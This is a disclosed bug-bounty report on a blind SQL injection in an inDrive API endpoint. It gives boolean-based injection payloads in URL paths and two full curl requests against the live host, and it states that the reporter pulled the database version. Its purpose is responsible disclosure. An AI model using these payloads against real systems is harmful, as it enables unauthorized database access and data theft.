# Blind SQL injection on id.indrive.com

## Report Details
- **Report ID**: 2051931
- **URL**: https://hackerone.com/reports/2051931
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2023-07-06T06:47:53.690Z
- **Disclosed**: 2023-11-24T14:37:55.035Z

## Reporter
- **Username**: kristoferent
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: indrive

## Vulnerability Information
## Summary:
The server does not perform sanitization on user input, allowing an attacker to inject arbitrary SQL commands into a query.

## Steps To Reproduce:

  1. Go to https://promo.indrive.com/10ridestogetprize_ru/random
  2. Click "Сгенерировать". A request to https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/29/5/phone will be made:

████████
 3. Repeat this request, but change the path to: 
```
/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--
```
A random entry from the database will be returned:

████
  4. Change the path in a query to:
```
/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--
```
The response from the server will be empty:

███████

**Both requests in curl format**
```
curl -i -s -k -X $'GET' \
    -H $'Host: id.indrive.com' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Origin: https://promo.indrive.com' -H $'Referer: https://promo.indrive.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' -H $'Connection: close' \
    $'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--'
```
```
curl -i -s -k -X $'GET' \
    -H $'Host: id.indrive.com' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Origin: https://promo.indrive.com' -H $'Referer: https://promo.indrive.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' -H $'Connection: close' \
    $'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--'
```

## Impact

This vulnerability allows attackers to inject any SQL statements into a query.
For example, I was able to retrieve the SQL version:
**PostgreSQL 14.8 (Ubuntu 14.8-0ubuntu0.22.04.1)**

## Attachments
No attachments
